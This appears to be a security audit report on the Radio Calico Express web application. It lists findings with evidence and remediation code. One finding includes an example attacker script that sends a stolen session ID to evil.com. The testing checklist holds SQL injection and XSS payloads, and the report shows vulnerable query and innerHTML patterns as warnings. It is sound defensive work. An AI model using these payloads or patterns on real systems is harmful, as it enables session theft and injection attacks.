# Security Audit Report - Radio Calico

**Date:** 2025-01-11
**Version:** 1.0
**Auditor:** Security Assessment
**Scope:** Complete codebase including server.js, db.js, public/app.js, and infrastructure

## Executive Summary

This security audit was performed on the Radio Calico application to identify vulnerabilities and security weaknesses. The application has been significantly improved with the addition of rate limiting, input validation, and security headers. However, several areas require attention before production deployment.

### Overall Security Posture

- **Current Status:** MODERATE (improved from LOW)
- **Critical Issues:** 2
- **High Issues:** 4
- **Medium Issues:** 6
- **Low Issues:** 3
- **Informational:** 5

### Key Improvements Made

✅ **Implemented** (during this audit):
- Rate limiting on all API endpoints
- Input validation using express-validator
- Security headers via helmet.js
- Request body size limits (10kb)
- CORS configuration for production
- Comprehensive security testing framework

## Critical Issues (Fix Immediately)

### C1: No HTTPS/TLS in Production

**Severity:** CRITICAL
**CVSS Score:** 9.1 (Critical)
**Affected Component:** Server deployment, nginx configuration

**Description:**
The application transmits sensitive data (including user fingerprints and IP addresses) over unencrypted HTTP connections.

**Evidence:**
```javascript
// server.js - No HTTPS enforcement
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🎵 Radio Server running on http://localhost:${PORT}`);
});
```

**Impact:**
- Man-in-the-middle attacks possible
- User fingerprints can be intercepted
- Session IDs can be stolen
- GDPR/privacy violations

**Remediation:**
1. Configure nginx with SSL/TLS certificates
2. Use Let's Encrypt for free certificates
3. Redirect all HTTP to HTTPS
4. Enable HSTS header (already in helmet config)

**Example fix for nginx.conf:**
```nginx
server {
    listen 443 ssl http2;
    ssl_certificate /etc/letsencrypt/live/domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/domain.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Existing config...
}

server {
    listen 80;
    return 301 https://$host$request_uri;
}
```

**Status:** ⚠️ **NOT FIXED** - Requires production deployment configuration

---

### C2: No Authentication/Authorization System

**Severity:** CRITICAL
**CVSS Score:** 8.6 (High)
**Affected Components:** All API endpoints

**Description:**
All API endpoints are publicly accessible without authentication. This allows:
- Anyone to view all feedback (GET /api/feedback)
- Anyone to modify song request status (PATCH /api/requests/:id)
- Anonymous users to spam the database

**Evidence:**
```javascript
// server.js:235 - Public access to all feedback
app.get('/api/feedback', async (req, res) => {
  const feedback = await database.all('SELECT * FROM feedback ORDER BY created_at DESC');
  res.json(feedback);  // ❌ No auth check
});

// server.js:305 - Anyone can change request status
app.patch('/api/requests/:id', strictLimiter, [...], async (req, res) => {
  // ❌ No verification that user is admin/DJ
  await database.run('UPDATE song_requests SET status = ? WHERE id = ?', [status, req.params.id]);
});
```

**Impact:**
- Unauthorized access to user data
- Request status manipulation
- Potential for data deletion/corruption
- Privacy violations

**Remediation:**

**Option 1: Role-Based Access Control (Recommended)**
```javascript
// Add authentication middleware
const authenticateJWT = (req, res, next) => {
  const token = req.header('Authorization')?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'Access denied' });

  try {
    const verified = jwt.verify(token, process.env.JWT_SECRET);
    req.user = verified;
    next();
  } catch (err) {
    res.status(400).json({ error: 'Invalid token' });
  }
};

const requireAdmin = (req, res, next) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Forbidden' });
  }
  next();
};

// Protect admin endpoints
app.get('/api/feedback', authenticateJWT, requireAdmin, async (req, res) => {
  // Only admins can view feedback
});

app.patch('/api/requests/:id', authenticateJWT, requireAdmin, [...], async (req, res) => {
  // Only admins can change status
});
```

**Option 2: API Key Authentication (Simpler)**
```javascript
const requireAPIKey = (req, res, next) => {
  const apiKey = req.header('X-API-Key');
  if (apiKey !== process.env.ADMIN_API_KEY) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
  next();
};

// Protect admin endpoints
app.get('/api/feedback', requireAPIKey, async (req, res) => {
  // Requires X-API-Key header
});
```

**Status:** ⚠️ **NOT FIXED** - Requires design decision on authentication method

---

## High Severity Issues

### H1: CORS Accepts All Origins in Development

**Severity:** HIGH
**CVSS Score:** 7.5
**Affected Component:** CORS middleware

**Description:**
Development mode allows requests from any origin, which could be accidentally deployed to production.

**Evidence:**
```javascript
// server.js:33-36
const corsOptions = {
  origin: process.env.NODE_ENV === 'production'
    ? process.env.ALLOWED_ORIGINS?.split(',') || 'http://localhost'  // ⚠️ Fallback to localhost
    : '*',  // ❌ Wide open in dev
};
```

**Impact:**
- CSRF attacks if deployed to production without proper env vars
- Data leakage to unauthorized domains
- Cross-origin attacks

**Remediation:**
1. Fail-safe approach - require explicit origin whitelist
2. Log warning if using fallback
3. Consider separate config files for dev/prod

```javascript
const corsOptions = {
  origin: (origin, callback) => {
    const whitelist = process.env.ALLOWED_ORIGINS?.split(',') || [];

    if (process.env.NODE_ENV !== 'production') {
      // Development: Allow localhost and null (for testing)
      if (!origin || origin.startsWith('http://localhost')) {
        return callback(null, true);
      }
    }

    if (whitelist.length === 0) {
      console.error('⚠️ ALLOWED_ORIGINS not set! CORS may block requests.');
    }

    if (whitelist.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  }
};
```

**Status:** ✅ **PARTIALLY FIXED** - Improved in server.js but needs env var enforcement

---

### H2: SQL Injection Risk in Database Abstraction

**Severity:** HIGH
**CVSS Score:** 7.3
**Affected Component:** db.js placeholder conversion

**Description:**
The database abstraction layer converts `?` to `$1, $2, ...` for PostgreSQL. If this conversion is buggy or if raw SQL is used elsewhere, SQL injection is possible.

**Evidence:**
```javascript
// db.js - Placeholder conversion
function convertPlaceholders(sql) {
  let index = 1;
  return sql.replace(/\?/g, () => `$${index++}`);
}
```

**Potential Issue:**
```javascript
// If someone uses string concatenation:
const query = `SELECT * FROM users WHERE name = '${userName}'`;  // ❌ VULNERABLE
await db.query(query);
```

**Current Status:**
✅ All endpoints in server.js use parameterized queries correctly

**Verification:**
```bash
# Check for string concatenation in queries
grep -r "database\.\(get\|all\|run\)" server.js | grep "\`.*\${"
# Result: No matches (good!)
```

**Remediation:**
1. Add ESLint rule to detect string interpolation in SQL
2. Code review guideline: Never use template literals in queries
3. Add unit tests for db.js placeholder conversion

**Status:** ✅ **MITIGATED** - Current code is safe, but need preventive measures

---

### H3: Weak Client-Side Fingerprinting

**Severity:** HIGH (Privacy)
**CVSS Score:** 6.8
**Affected Component:** public/app.js fingerprinting

**Description:**
Client-side fingerprinting can be easily bypassed by attackers to vote multiple times.

**Evidence:**
```javascript
// public/app.js:34-73
function generateFingerprint() {
  // Uses canvas, user agent, screen resolution, etc.
  // ❌ Can be spoofed with browser extensions
  // ❌ Easily bypassed in incognito mode
  // ❌ localStorage can be cleared
}
```

**Attack Scenario:**
1. Attacker votes thumbs up
2. Opens incognito window → different fingerprint
3. Votes thumbs up again
4. Repeat unlimited times

**Impact:**
- Vote manipulation
- Poll results unreliable
- Unfair rating system

**Remediation:**

**Current Mitigation:**
✅ Server-side fingerprinting in server.js (IP + User-Agent + headers) provides primary protection

**Additional Recommendations:**
1. Rate limit more aggressively (currently 10 votes/min)
2. Detect suspicious patterns (multiple votes from similar IPs)
3. Consider requiring lightweight auth (email verification)
4. Add CAPTCHA for suspected bots

```javascript
// Enhanced rate limiting for ratings
const ratingsLimiter = rateLimit({
  windowMs: 5 * 60 * 1000,  // 5 minutes
  max: 5,  // Only 5 votes per 5 minutes
  skipSuccessfulRequests: false,
});
```

**Status:** ⚠️ **PARTIALLY MITIGATED** - Server-side fingerprint helps but not foolproof

---

### H4: No CSRF Protection

**Severity:** HIGH
**CVSS Score:** 6.5
**Affected Component:** All POST/PATCH endpoints

**Description:**
The application does not implement CSRF tokens, making it vulnerable to cross-site request forgery attacks.

**Attack Scenario:**
1. User is logged into Radio Calico (if auth is added later)
2. User visits malicious website
3. Malicious website makes POST request to /api/ratings
4. Vote is submitted without user's consent

**Current Status:**
⚠️ Not critical yet since there's no authentication, but will be critical when auth is added

**Remediation:**
```bash
npm install csurf
```

```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// Apply to state-changing routes
app.post('/api/ratings', csrfProtection, ratingsLimiter, [...], async (req, res) => {
  // CSRF token verified automatically
});

// Send token to frontend
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});
```

**Frontend:**
```javascript
// Fetch and include token
const csrfToken = await fetch('/api/csrf-token').then(r => r.json());

fetch('/api/ratings', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'CSRF-Token': csrfToken.csrfToken
  },
  body: JSON.stringify({ song_id, rating })
});
```

**Status:** ⚠️ **NOT FIXED** - Should be implemented before adding authentication

---

## Medium Severity Issues

### M1: Unescaped User Input in Frontend

**Severity:** MEDIUM
**CVSS Score:** 5.4
**Affected Component:** public/app.js DOM updates

**Description:**
User input from metadata is inserted into DOM using `.textContent` (safe) but could be vulnerable if code changes.

**Evidence:**
```javascript
// public/app.js:256-259 - Currently safe
trackArtist.textContent = data.artist || 'Unknown Artist';
trackTitle.textContent = data.title || 'Unknown Track';
```

**Potential Risk:**
If developer changes to `.innerHTML`:
```javascript
// ❌ VULNERABLE
trackArtist.innerHTML = data.artist;  // XSS possible
```

**Remediation:**
1. Add ESLint rule: `no-unsanitized/property`
2. Code review checklist: Never use `.innerHTML` with user data
3. If HTML is needed, use DOMPurify:

```javascript
import DOMPurify from 'dompurify';
trackArtist.innerHTML = DOMPurify.sanitize(data.artist);
```

**Status:** ✅ **SAFE** currently, needs preventive measures

---

### M2: Information Disclosure in Error Messages

**Severity:** MEDIUM
**CVSS Score:** 5.3
**Affected Component:** All API endpoints

**Description:**
Database errors expose internal structure to clients.

**Evidence:**
```javascript
// server.js - Multiple instances
} catch (error) {
  res.status(500).json({ error: error.message });  // ⚠️ Leaks details
}
```

**Example Leaked Error:**
```json
{
  "error": "SQLITE_ERROR: no such column: user_password"
}
```

Reveals:
- Database type (SQLite vs PostgreSQL)
- Table structure
- Column names

**Remediation:**
```javascript
} catch (error) {
  console.error('Database error:', error);  // Log full error server-side

  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal server error' });
  } else {
    res.status(500).json({ error: error.message });  // Detailed in dev
  }
}
```

**Status:** ⚠️ **NOT FIXED** - Should sanitize error messages

---

### M3: No Request Timeout Configuration

**Severity:** MEDIUM
**CVSS Score:** 5.0
**Affected Component:** Express server

**Description:**
Long-running requests can cause resource exhaustion.

**Evidence:**
```javascript
// server.js - No timeout set
app.listen(PORT, '0.0.0.0', () => { /* ... */ });
```

**Remediation:**
```javascript
const server = app.listen(PORT, '0.0.0.0', () => { /* ... */ });

// Set request timeout
server.setTimeout(30000);  // 30 seconds

// Or per-route
app.use('/api/', (req, res, next) => {
  req.setTimeout(10000);  // 10 seconds for API
  next();
});
```

**Status:** ⚠️ **NOT FIXED** - Should add timeout configuration

---

### M4: Session Storage in localStorage

**Severity:** MEDIUM
**CVSS Score:** 4.7
**Affected Component:** public/app.js session management

**Description:**
localStorage is accessible to JavaScript, vulnerable to XSS attacks.

**Evidence:**
```javascript
// public/app.js:79
localStorage.setItem('radio_session_id', sessionId);
```

**Risk:**
If XSS vulnerability exists, attacker can steal session ID:
```javascript
// Attacker's script
const sessionId = localStorage.getItem('radio_session_id');
fetch('https://evil.com/steal?id=' + sessionId);
```

**Current Mitigation:**
✅ Content-Security-Policy prevents inline scripts
✅ Input validation prevents XSS in server responses

**Better Solution:**
Use httpOnly cookies (immune to JavaScript access):

```javascript
// Server-side
res.cookie('session_id', sessionId, {
  httpOnly: true,  // Not accessible via JavaScript
  secure: true,    // HTTPS only
  sameSite: 'strict',
  maxAge: 365 * 24 * 60 * 60 * 1000  // 1 year
});
```

**Status:** ✅ **ACCEPTABLE** risk given CSP, but httpOnly cookies would be better

---

### M5: IP Address Storage (GDPR Concern)

**Severity:** MEDIUM (Legal/Privacy)
**CVSS Score:** N/A (Legal issue)
**Affected Component:** song_ratings table

**Description:**
IP addresses are personally identifiable information (PII) under GDPR.

**Evidence:**
```javascript
// server.js:266
const ip_address = getClientIP(req);

// Stored in database
INSERT INTO song_ratings (song_id, session_id, ip_address, user_fingerprint, rating)
VALUES (?, ?, ?, ?, ?)
```

**GDPR Requirements:**
- Users must consent to IP storage
- Users can request deletion
- IP must be necessary for service
- Should be encrypted or hashed

**Remediation:**

**Option 1: Hash IP addresses**
```javascript
const crypto = require('crypto');
function hashIP(ip) {
  return crypto.createHash('sha256')
    .update(ip + process.env.IP_SALT)  // Add salt
    .digest('hex');
}

const ip_hash = hashIP(getClientIP(req));
// Store ip_hash instead of raw IP
```

**Option 2: Don't store IP at all**
```javascript
// user_fingerprint already includes IP in the hash
// ip_address column is redundant
const ip_address = null;  // Don't store
```

**Recommendation:**
Remove `ip_address` column entirely, rely on `user_fingerprint` which already includes IP in hash.

**Status:** ⚠️ **NEEDS REVIEW** - Consider GDPR compliance requirements

---

### M6: No Database Connection Pooling Limits

**Severity:** MEDIUM
**CVSS Score:** 4.3
**Affected Component:** db.js PostgreSQL configuration

**Description:**
PostgreSQL pool has max 20 connections but no queue limits.

**Evidence:**
```javascript
// db.js:23-32
db = new Pool({
  max: 20,  // ✅ Good
  idleTimeoutMillis: 30000,  // ✅ Good
  connectionTimeoutMillis: 2000,  // ✅ Good
  // ❌ Missing: waitForAvailableConnectionTimeoutMillis
});
```

**Risk:**
If 20 connections are busy, new requests wait indefinitely.

**Remediation:**
```javascript
db = new Pool({
  max: 20,
  min: 2,  // Keep 2 connections always open
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000,
  waitForAvailableConnectionTimeoutMillis: 5000,  // Wait max 5s
});
```

**Status:** ⚠️ **NOT FIXED** - Should add connection queue timeout

---

## Low Severity Issues

### L1: Missing Logging and Monitoring

**Severity:** LOW
**Affected Component:** Entire application

**Description:**
No structured logging or monitoring for security events.

**Should Log:**
- Failed validation attempts
- Rate limit violations
- Suspicious patterns (many votes from same IP)
- Database errors
- Authentication failures (when implemented)

**Remediation:**
```bash
npm install winston
```

```javascript
const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'logs/error.log', level: 'error' }),
    new winston.transports.File({ filename: 'logs/combined.log' }),
  ],
});

// Log security events
logger.warn('Rate limit exceeded', { ip: getClientIP(req), endpoint: req.path });
logger.error('Validation failed', { errors: validationResult(req).array() });
```

**Status:** ⚠️ **NOT IMPLEMENTED** - Consider adding structured logging

---

### L2: No Dependency Version Pinning

**Severity:** LOW
**Affected Component:** package.json

**Description:**
Dependencies use caret (^) ranges, may install breaking changes.

**Evidence:**
```json
{
  "express": "^4.18.2",  // Could install 4.19.0 with breaking changes
  "helmet": "^7.1.0"
}
```

**Remediation:**
```bash
# Generate package-lock.json (already exists ✅)
npm install

# Or use exact versions
"express": "4.18.2",
"helmet": "7.1.0"
```

**Status:** ✅ **ACCEPTABLE** - package-lock.json provides reproducibility

---

### L3: Default Error Page Exposes Technology Stack

**Severity:** LOW
**Affected Component:** Express error handler

**Description:**
Express default error page reveals "Express" in development.

**Remediation:**
```javascript
// Custom error handler
app.use((err, req, res, next) => {
  console.error(err.stack);
  res.status(500).json({
    error: process.env.NODE_ENV === 'production'
      ? 'Internal server error'
      : err.message
  });
});
```

**Status:** ⚠️ **NOT FIXED** - Add custom error handler

---

## Informational Findings

### I1: Security Headers Could Be Enhanced

**Current Headers (via Helmet):**
✅ Content-Security-Policy
✅ X-Frame-Options
✅ X-Content-Type-Options
✅ Strict-Transport-Security

**Additional Recommended Headers:**
```javascript
app.use(helmet({
  // ... existing config
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
  permittedCrossDomainPolicies: { permittedPolicies: 'none' },
}));
```

---

### I2: Consider Adding Security.txt

Create `/public/.well-known/security.txt`:
```
Contact: security@radiocalico.com
Expires: 2026-01-01T00:00:00.000Z
Preferred-Languages: en
```

---

### I3: Add Subresource Integrity (SRI)

For external scripts (HLS.js):
```html
<script src="https://cdn.jsdelivr.net/npm/hls.js@latest"
        integrity="sha384-..."
        crossorigin="anonymous"></script>
```

---

### I4: Database Migration Safety

Current migrations run on every startup. Consider:
- Version tracking (don't re-run migrations)
- Rollback capability
- Backup before migration

---

### I5: Environment Variable Validation

Add validation on startup:
```javascript
const requiredEnvVars = ['POSTGRES_PASSWORD', 'ALLOWED_ORIGINS'];
for (const varName of requiredEnvVars) {
  if (process.env.NODE_ENV === 'production' && !process.env[varName]) {
    throw new Error(`Missing required env var: ${varName}`);
  }
}
```

---

## Positive Security Findings

### ✅ What's Working Well

1. **Rate Limiting**: Comprehensive limits on all endpoints
2. **Input Validation**: express-validator on all user inputs
3. **Parameterized Queries**: No SQL injection vulnerabilities found
4. **Security Headers**: Helmet.js properly configured
5. **Request Size Limits**: 10kb limit prevents DoS
6. **CORS Configuration**: Production-ready (needs env vars)
7. **Fingerprint Hashing**: Server-side fingerprints use SHA-256
8. **No Hardcoded Secrets**: All secrets in environment variables
9. **Database Abstraction**: Consistent parameter handling
10. **Test Coverage**: 50%+ code coverage with security-focused tests

---

## Recommendations by Priority

### Immediate (Before Production)

1. ⚠️ **Configure HTTPS/TLS** (C1)
2. ⚠️ **Implement authentication for admin endpoints** (C2)
3. ⚠️ **Add CSRF protection** (H4)
4. ⚠️ **Sanitize error messages** (M2)
5. ⚠️ **Set ALLOWED_ORIGINS environment variable** (H1)

### Short-Term (Next Sprint)

6. ⚠️ **Add request timeouts** (M3)
7. ⚠️ **Implement structured logging** (L1)
8. ⚠️ **Add custom error handler** (L3)
9. ⚠️ **Review GDPR compliance for IP storage** (M5)
10. ⚠️ **Add database connection queue limits** (M6)

### Long-Term (Future Enhancements)

11. **Consider httpOnly cookies for sessions** (M4)
12. **Add anomaly detection for vote manipulation** (H3)
13. **Implement Subresource Integrity** (I3)
14. **Add security.txt** (I2)
15. **Improve database migrations** (I4)

---

## Security Testing Recommendations

### Automated Testing

```bash
# Run before every commit
make security

# Run before every deployment
make security-full

# Run weekly
make security-api  # Dynamic testing with OWASP ZAP
```

### Manual Testing Checklist

- [ ] Test rate limiting (send 100+ requests)
- [ ] Test input validation (send invalid data)
- [ ] Test CORS (cross-origin requests)
- [ ] Test error handling (cause database errors)
- [ ] Test vote manipulation (multiple votes)
- [ ] Test SQL injection (send `'; DROP TABLE--`)
- [ ] Test XSS (`<script>alert('XSS')</script>`)
- [ ] Test large payloads (> 10kb)
- [ ] Test concurrent connections
- [ ] Test database connection exhaustion

---

## Compliance Considerations

### GDPR (EU Users)

- ⚠️ **IP address storage**: Hash or remove
- ⚠️ **Cookie consent**: Required if using cookies
- ⚠️ **Privacy policy**: Must disclose data collection
- ⚠️ **Right to erasure**: Implement data deletion API
- ✅ **Data minimization**: Only collect necessary data
- ✅ **Security measures**: Encryption, hashing in place

### CCPA (California Users)

- ⚠️ **Privacy notice**: Disclose data sales (none currently)
- ⚠️ **Do Not Sell**: Honor DNT header
- ⚠️ **Data access**: Provide user data on request

---

## Conclusion

The Radio Calico application has been significantly improved with the addition of comprehensive security measures including rate limiting, input validation, and security headers. The codebase demonstrates good security practices with parameterized queries, no hardcoded secrets, and proper use of encryption.

However, **production deployment requires**:
1. HTTPS/TLS configuration
2. Authentication for administrative endpoints
3. CSRF protection
4. Environment variable configuration
5. GDPR compliance review

With these fixes implemented, the application will have a **HIGH** security posture suitable for production use.

---

**Next Steps:**

1. Review and prioritize findings
2. Create GitHub issues for each HIGH/CRITICAL item
3. Implement fixes according to priority
4. Re-run security scans
5. Perform penetration testing
6. Document acceptable risks
7. Deploy to production

**Questions or concerns?** Refer to `SECURITY.md` for detailed security testing procedures.
